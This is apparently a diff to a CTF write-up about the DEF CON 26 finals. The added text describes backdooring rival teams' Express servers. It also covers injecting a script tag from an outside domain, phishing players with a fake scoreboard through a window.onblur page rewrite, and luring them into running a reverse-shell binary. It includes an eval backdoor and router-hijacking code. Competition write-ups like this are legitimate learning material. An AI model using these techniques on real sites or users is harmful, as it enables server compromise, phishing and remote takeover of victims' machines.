@@ -71,9 +71,11 @@ I realized that I could patch the server dynamically by just reassigning the `AS
 ASM_CONSTS[0] = function(ptr) { str = Pointer_stringify(ptr); if(str.includes("DAT_BEST_BACK_DOOR_SECRET")) eval(str); return (str.includes("_") || str.includes("/")) ? 1 : 0; }
 ```
 
-Meanwhile `aegis` figured out that he could modify the `express` web server handler chain to do all sorts of fun things. First he figured out how to take down all the pages, then how to add a backdoor flag page by mounting root as a public directory.
+Meanwhile `aegis` figured out that he could modify the `express` web server handler chain to do all sorts of fun things. First he figured out how to take down all the pages, then how to add a backdoor flag page by mounting root as a public directory, then how to change responses to ones of our choosing.
 
 I talked this with `aegis` and we realized this was so absurdly easy and powerful that the organizers couldn't have thought of it. We realized we could insert a backdoor that let us get the flag and then close the door to all the other teams, with the only weakness being if another team realized this and closed the door first. If no other teams figured this out and beat us then we would get all the flags and no other team would get any, we could also close our own door without inserting the backdoor.
+
+We took this plan to the evening team meeting and then `bool` (team founder Steve Vittitoe) came up with an amazing idea: Not only do we backdoor and close the door, but we add a script to all the pages that turns the page into a fake scoreboard on blur with a fake new challenge that gives us a reverse shell on their machine! After a moment of silence as we were struck by the brilliance of his idea, we enthusiastically started brainstorming our plan.
 
 We realized that if we were lucky and were the only team to figure this out, we needed to not leak our exploit publicly so other teams could immediately figure it out themselves. So I started by developing a thrower script for our exploits that could be run automatically and would ensure a team was backdoored and the door was closed without leaking our exploit in case of a patched team that accepted all submissions:
 
@@ -83,7 +85,7 @@ We realized that if we were lucky and were the only team to figure this out, we 
 1. Check that we can retrieve the flag, if not bail and log an error.
 1. Close the door and check that the door was successfully closed and log if not.
 
-Next I worked on improving `aegis`'s payload to place the flag backdoor at a less obvious place than `/flag` which required some URL rewriting. This is the payload I ended up with:
+Next I worked on improving `aegis`'s payload to place the flag backdoor at a less obvious place than `/flag` which required some URL rewriting and also crafting an Express chain rewriting payload based on his research that could insert a script tag into all pages without modifying the rest of the page. This is the payload I ended up with:
 
 ```js
 // Part 1: exposes the flag at /flagaaa
@@ -94,7 +96,32 @@ process.mainModule.children[0].exports._router.stack[5].handle = function(req, r
   }
   return s(req, res, next);
 };
+// Part 2: replaces </body> with our script tag on every response
+process.mainModule.children[0].exports._router.stack[3].handle = function(req, res, next) {
+    var oldSend = res.send;
+
+    res.send = function(data){
+        data = data.replace(/(<\/body>)/, "<script src='https://our-xss-domain.redacted/ourpayload.js'></script></body>");
+        oldSend.apply(res, [data]);
+    }
+    next();
+};
 ```
+
+Then I worked on the actual XSS payload which used a giant inline JS backtick string with our fake scoreboard HTML and a short snippet which overwrote the whole page with our fake one, including a favicon, and also fixed the URL to be just the IP address, knowing nobody would notice the difference between the scoreboard IP address and the challenge IP address:
+
+```js
+window.onblur = function() {
+    window.history.pushState('scoreboard', 'DC26 CTF', '/');
+    document.open();
+    document.write(newpage2);
+    document.close();
+};
+```
+
+While I had been doing all this, `bool` had whipped up a domain and server to host the XSS and fake challenge payloads, as well as completely replicating the official scoreboard's appearance but with an extra challenge. He also added a red notice about the new challenge, which hadn't happened for any of the real challenges, but we figured it made it more likely people would fall into it rather than less. He also set up a server to receive and manage any reverse shell connections we got.
+
+Meanwhile `aegis` worked on a fake challenge binary that would spin off a reverse shell that would persist even if the challenge binary was killed. For fun he also created a bunch of fake reversing steps that made it seem like an actual challenge binary and made it difficult to notice it was a reverse shell.
 
 By this point it was 4am and we were tired after our 2nd consecutive 20 hour day so we went to sleep. We woke up just before the contest opened again, and I got ready to throw our door closer at our own server manually since we had only automated the throwing at other teams.
 
@@ -102,7 +129,9 @@ But our worst fears came true and total victory was snatched from our grasp by a
 
 Shortly later the contest organizers realized or were informed of their oversight about persistent exploits and they put in a workaround of restarting the servers every couple minutes to give all teams a chance to slip in. After streamlining my thrower to not be cautious and be faster since clearly lots of other teams knew about the problem and were already leaking their exploits, we managed to regularly slip into a few teams servers each restart.
 
-It wasn't the glorious victory of monopolizing the flags that we'd dreamed of, but we still got some people and were really proud of our clever plan and exploits.
+Soon `bool` started to see hits on his XSS server. We were pretty happy it was finally working. One team even downloaded our fake challenge binary, but unfortunately they don't seem to have run it.
+
+It wasn't the glorious victory of monopolizing the flags and owning dozens of machines that we'd dreamed of, but we still got some people and were really proud of our clever plan and exploits. We were really happy when after the contest we talked to one of the organizers and they said they loved our idea and that actually multiple teams had come up to them and asked why the new challenge on the website wasn't up on the projector screens! The organizer didn't even realize it was a trick originally and went and asked another organizer if they had released a new challenge accidentally!
 
 # reeducation
 
@@ -122,4 +151,4 @@ However, while they were working on that I worked on developing a patch. In Bina
 
 # Conclusion
 
-I had a ton of fun, and my team (Samurai) ended up coming 11th, which although it isn't as good as our first place finish in the qualifiers, is pretty good considering how high level the competition at the event was. I also learned a bunch more about competing in CTFs from my awesome teammates!
+I had a ton of fun, and my team (Samurai) ended up coming 11th, which although it isn't as good as our first place finish in the qualifiers, is pretty good considering how high level the competition at the event was. I think the real victory though was our awesome fake challenge XSS exploit for `bew`, that was really fun to pull off. I also learned a bunch more about competing in CTFs from my awesome teammates!
